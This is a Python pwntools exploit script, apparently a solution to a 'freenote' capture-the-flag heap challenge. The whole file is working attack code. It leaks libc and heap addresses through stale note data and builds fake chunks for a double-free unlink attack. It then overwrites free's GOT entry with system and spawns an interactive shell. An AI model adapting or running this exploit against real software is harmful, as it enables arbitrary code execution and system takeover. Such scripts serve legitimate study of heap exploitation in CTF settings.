#!/usr/bin/env python
from pwn import *

#switch
DEBUG = 0
LOCAL = 1
VERBOSE = 1

if LOCAL:
    p = process('./freenote')
else:
    p = remote('127.0.0.1',6666)

if VERBOSE:
    context(log_level='debug')

def new_note(x):
    p.recvuntil("Your choice: ")
    p.send("2\n")
    p.recvuntil("Length of new note: ")
    p.send(str(len(x))+"\n")
    p.recvuntil("Enter your note: ")
    p.send(x)

def delete_note(x):
    p.recvuntil("Your choice: ")
    p.send("4\n")
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")

def list_note():
    p.recvuntil("Your choice: ")
    p.send("1\n")
    
def edit_note(x,y):
    p.recvuntil("Your choice: ")
    p.send("3\n")   
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")   
    p.recvuntil("Length of note: ")
    p.send(str(len(y))+"\n") 
    p.recvuntil("Enter your note: ")
    p.send(y)

if DEBUG: 
    gdb.attach(p)
    

raw_input('*************************Leak_Libc*******************************8')

notelen=0x80

new_note("A"*notelen)
new_note("B"*notelen)
delete_note(0)

new_note("AAAAAAAA")
list_note()
p.recvuntil("0. AAAAAAAA")
leak = p.recvuntil("\n")


leaklibcaddr = u64(leak[0:-1].ljust(8, '\x00'))-0x3be7b8
print hex(leaklibcaddr)

system_sh_addr = leaklibcaddr + 0x46590
print "system_sh_addr: " + hex(system_sh_addr)
bin_sh_addr = leaklibcaddr + 0x17c8c3

delete_note(1)
delete_note(0)




raw_input('******************Leak_heap******************')
notelen=0x80

new_note("A"*notelen)
new_note("B"*notelen)
new_note("C"*notelen)
new_note("D"*notelen)
delete_note(2)
delete_note(0)

new_note("AAAAAAAA")
list_note()
p.recvuntil("0. AAAAAAAA")
leak = p.recvuntil("\n")

#print leak[0:-1].encode('hex')
heapBase= u64(leak[0:-1].ljust(8, '\x00'))-0x1820
print "heapBase:"+hex(heapBase)

delete_note(0)
delete_note(1)
delete_note(3)


gdb.attach(p)
raw_input('*******************doubel_free*****************')
notelen = 0x80

#new_note("/bin/sh\x00"+"A"*(notelen-8))
new_note("A"*notelen)
new_note("B"*notelen)
new_note("C"*notelen)

delete_note(2)
delete_note(1)
delete_note(0)

fd = heapBase + 0x18#notetable
bk = fd + 0x8


payload  = ""
payload += p64(0x0) + p64(notelen+1) + p64(fd) + p64(bk) + "A" * (notelen - 0x20)
payload += p64(notelen) + p64(notelen+0x10) + "A" * notelen
payload += p64(0) + p64(notelen+0x11)+ "\x00" * (notelen-0x20)

new_note(payload)
raw_input('*******************beforetest*****************')
delete_note(1)

free_got = 0x602018

payload2 = p64(2)+p64(1)+p64(0x8)+p64(free_got)+'A'*0x10+p64(bin_sh_addr)
payload2 += 'A'*(0x180-len(payload2))


edit_note(0, payload2)
edit_note(0, p64(system_sh_addr))
delete_note(1)

p.interactive()
